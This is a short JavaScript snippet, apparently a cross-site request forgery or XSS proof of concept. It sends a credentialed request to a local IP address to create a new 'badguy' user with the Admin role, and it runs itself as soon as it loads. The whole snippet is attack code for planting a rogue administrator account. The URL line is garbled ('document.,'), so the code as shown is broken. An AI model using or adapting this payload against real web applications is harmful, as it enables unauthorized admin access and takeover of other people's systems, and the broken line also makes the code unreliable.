function submitRequest()
{
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://192.168.1.110/"+document., true);
  xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
  xhr.withCredentials = true;
  var body = "fname=Bad&lname=Guy&username=badguy&password=&trackerkey=0&role=Admin&status=Active";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
}
submitRequest();



